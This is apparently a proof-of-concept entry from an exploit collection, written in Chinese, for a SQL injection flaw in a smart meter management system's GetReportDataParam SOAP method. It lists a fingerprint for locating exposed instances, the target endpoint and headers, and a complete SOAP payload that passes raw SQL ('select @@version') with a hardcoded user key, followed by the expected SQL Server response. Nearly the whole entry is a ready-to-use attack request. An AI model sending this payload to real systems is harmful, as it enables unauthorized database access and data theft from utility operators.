# 智能表综合管理系统GetReportDataParam存在SQL注入漏洞

- **系统**：智能表综合管理系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="headerTableWrap"`
- **请求**：`POST /SunReportService.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`SOAPAction: "http://suntront.com/GetReportDataParam "`　`Content-Length: 456`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetReportDataParam xmlns="http://suntront.com/">
<sqltxt>select @@version</sqltxt>
<SqlParam>{"a":"1"}</SqlParam>
<Userkey>XTSunReport</Userkey>
</GetReportDataParam>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　Microsoft SQL Server